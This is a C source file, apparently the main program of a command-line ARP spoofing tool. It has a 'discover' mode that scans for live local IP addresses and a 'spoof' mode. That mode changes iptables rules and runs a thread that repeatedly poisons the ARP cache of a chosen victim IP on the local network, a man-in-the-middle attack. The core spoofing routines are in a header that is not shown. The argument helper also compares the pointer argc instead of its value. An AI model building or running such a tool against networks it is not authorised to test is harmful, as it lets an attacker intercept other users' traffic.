#include "core.h"
#include <assert.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <string.h>

pthread_t ARP_SPOOF_TID = -1;
ARPSpoofArgs ARP_SPOOF_ARGS = {0};
LocalIPDiscoveryArgs LOCAL_IP_DISCOVERY_ARGS = {0};

void sigint_handler(int sig) {
    ARP_SPOOF_ARGS.is_terminated = 1;
}

char* shift_args(int* argc, char*** argv) {
    if (argc <= 0)
        return NULL;
    char* result = **argv;
    (*argc) -= 1;
    (*argv) += 1;
    return result;
}

void print_usage(const char* program) {
    fprintf(stderr, "Usage: %s <mode> <interface> <victim>\n", program);
    fprintf(stderr, "Modes:\n");
    fprintf(stderr, "  discover : Discover alive local ips\n");
    fprintf(stderr, "  spoof : Spoof some local ip\n");
    fprintf(stderr, "\nOptions:\n");
    fprintf(
        stderr, " <interface> : Your network interface name (e.g wlp1s0)\n"
    );
    fprintf(
        stderr,
        " <victim> : Local ip address to spoof (for `spoof` mode)\n"
    );
    fprintf(stderr, "  --help      : Display this usage message\n");
}

int discover(char* if_name) {
    LOCAL_IP_DISCOVERY_ARGS.if_name = if_name;
    LOCAL_IP_DISCOVERY_ARGS.requests_chunk_len = 32;
    start_local_ip_discovery((void*)&LOCAL_IP_DISCOVERY_ARGS);

    return 0;
}

int spoof(char* if_name, char* victim_addr_str) {
    reset_iptables();
    set_iptables();
    signal(SIGINT, sigint_handler);

    ARP_SPOOF_ARGS.if_name = if_name;
    ARP_SPOOF_ARGS.victim_addr_str = victim_addr_str;
    ARP_SPOOF_ARGS.spoof_period_sec = 1;

    if (pthread_create(
            &ARP_SPOOF_TID, NULL, start_arp_spoof, (void*)&ARP_SPOOF_ARGS
        )
        != 0) {
        fprintf(
            stderr, "ERROR: Failed to create start_arp_spoof thread\n\n"
        );
        return 1;
    }

    pthread_join(ARP_SPOOF_TID, NULL);
    reset_iptables();
    return 0;
}

int main(int argc, char** argv) {
    const char* program = shift_args(&argc, &argv);

    if (argc <= 0) {
        print_usage(program);
        return 1;
    }

    char* mode = shift_args(&argc, &argv);
    bool is_help = strcmp(mode, "--help") == 0;
    bool is_discover = strcmp(mode, "discover") == 0;
    bool is_spoof = strcmp(mode, "spoof") == 0;
    if (is_help) {
        print_usage(program);
        return 0;
    } else if (!is_discover && !is_spoof) {
        fprintf(stderr, "ERROR: Please, pass mode first\n\n");
        print_usage(program);
        return 1;
    }

    char* if_name = shift_args(&argc, &argv);
    if (if_name == NULL) {
        fprintf(
            stderr,
            "ERROR: Please, pass your interface name (e.g wlp1s0)\n\n"
        );
        print_usage(program);
        return 1;
    }

    if (is_discover) {
        return discover(if_name);
    } else if (is_spoof) {
        char* victim_addr_str = shift_args(&argc, &argv);
        if (victim_addr_str == NULL) {
            fprintf(
                stderr,
                "ERROR: Please, pass local ip to spoof (e.g "
                "192.168.0.101)\n\n"
            );
            print_usage(program);
            return 1;
        }
        return spoof(if_name, victim_addr_str);
    } else {
        print_usage(program);
        return 1;
    }
}
